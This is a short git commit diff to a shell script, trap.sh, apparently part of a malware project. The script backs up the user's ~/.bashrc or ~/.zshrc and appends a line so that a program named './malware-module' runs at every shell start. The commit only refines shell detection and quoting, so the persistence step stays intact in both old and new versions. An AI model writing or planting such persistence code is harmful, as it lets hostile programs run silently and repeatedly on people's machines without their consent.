aff44c12f458066ee3e785782401f13c6ea0a1b2
Ezhkin-Kot <ezkot.tokze@gmail.com>
2025-09-17 13:41:05 +0400

    fix: script

--- trap.sh
+++ trap.sh
@@ -1,12 +1,8 @@
-if [[ "$SHELL" == "/bin/bash" ]]
-then 
+if [ -n "$BASH_VERSION" ]; then
   cp ~/.bashrc ~/.bashrc.bak
-  echo ./malware-module >> ~/.bashrc
-fi
-
-if [[ "$SHELL" == "/bin/zsh" ]]
-then
+  echo "./malware-module" >> ~/.bashrc
+elif [ -n "$ZSH_VERSION" ]; then
   cp ~/.zshrc ~/.zshrc.bak
-  echo ./malware-module >> ~/.zshrc
+  echo "./malware-module" >> ~/.zshrc
 fi
 
